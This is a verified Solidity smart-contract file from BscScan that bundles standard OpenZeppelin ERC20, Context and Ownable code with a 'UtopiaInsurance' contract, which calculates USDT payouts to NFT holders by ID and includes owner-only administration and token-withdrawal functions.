/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/Utopia/UtopiaInsurance.sol


pragma solidity ^0.8.17;



interface UtopiaNFT {
    function ownerOf(uint256 tokenId) external view returns (address);
    function totalSupply() external view returns(uint256);
}

interface IERC20Ext is IERC20 {
    function balanceOf() external view returns(uint8);
}

contract UtopiaInsurance is  Ownable {

    uint256 public lastTime;
    uint256 public endTime = 86400;
    UtopiaNFT public utopiaNFT;
    IERC20Ext public usdt;
    mapping(address=>bool) public derivation;

    constructor(address utopiaNFT_) {
        utopiaNFT = UtopiaNFT(utopiaNFT_);
        usdt = IERC20Ext(0x0B7E566590D26Ec368e08e23cEa6B18e618f541c);
    }

    function setLastTime() public onlyDerivation{
        lastTime = block.timestamp;
    }

    function getInsurance(uint256 IDCARD) public view returns(uint256){
        uint256 num = utopiaNFT.totalSupply();
        require(IDCARD <= num, "[UtopiaInsurance] Nonexistent IDCARD!");
        uint256 amount = 0;
        uint256 totalamount = usdt.balanceOf(address(this));

        if(totalamount > 0 && num >= 100){
            if(IDCARD == num){
                amount = totalamount*50/100;
            }else if(IDCARD > num - 100){
                amount = (totalamount-totalamount*50/100)*99/1000/99;
            }else{
                if(totalamount - (totalamount*599/1000) > (num - 100 - IDCARD) * 100 ether){
                    if((totalamount - (totalamount*599/1000)) - ((num - 100 - IDCARD) * 100 ether) >= 100 ether){
                        amount = 100 ether;
                    }else{
                        amount = (totalamount - (totalamount*599/1000)) - ((num - 100 - IDCARD) * 100 ether);
                    }
                }else{
                    amount = 0;
                }
            }
        }
        return amount;
    }

    function setDerivation(address contract_) public onlyOwner{
        derivation[contract_] = true;
    }

    function closeDerivation(address contract_) public onlyOwner{
        derivation[contract_] = false;
    }

    modifier onlyDerivation() {
        require(derivation[msg.sender] == true || msg.sender == owner(), "[UtopiaInsurance] This function can be called only from admin!");
        _;
    }

    function _tokenAllocation(IERC20 _ERC20, address _address, uint256 _amount) external onlyOwner{
        _ERC20.transfer(_address, _amount);
    }
}